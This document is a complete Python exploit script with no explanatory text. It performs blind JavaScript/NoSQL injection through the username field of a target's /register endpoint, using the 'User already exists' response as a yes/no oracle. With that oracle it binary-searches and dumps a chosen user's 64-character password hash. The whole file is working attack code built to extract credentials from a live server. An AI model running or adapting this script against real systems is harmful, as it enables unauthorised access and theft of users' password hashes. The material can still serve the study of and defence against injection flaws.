#!/usr/bin/python3
import requests
import sys

if len(sys.argv) != 3:
    print("usage: %s TARGET USER" % sys.argv[0])
    sys.exit(-1)

target = sys.argv[1]
user   = sys.argv[2]

# u: username
# i: index
# o: operator
# c: char (ascii val)
q = '%s\' && this.password.substring(%d,%d).charCodeAt(0)%s\'%d'
def oracle(u, i, o, c):
	_q = q % (u, i, (i+1), o, c)
	d = {'username':_q,'password':'x'}
	r = requests.post('http://%s/register'%target,data=d,allow_redirects=False)
	return 'User already exists' in r.text

print('(+) Dumping %s\'s password hash...'%user)
print('(+) ',end='')

for i in range(64):
	low = 48   # '0'
	high = 102 # 'f'
	mid = 0

	while low <= high:
		mid = (high + low) // 2

		if oracle(user, i, '>', mid):
			low = mid + 1

		elif oracle(user, i, '<', mid):
			high = mid - 1

		else:
			sys.stdout.write(chr(mid))
			sys.stdout.flush()
			break

print('\n(+) Done!')
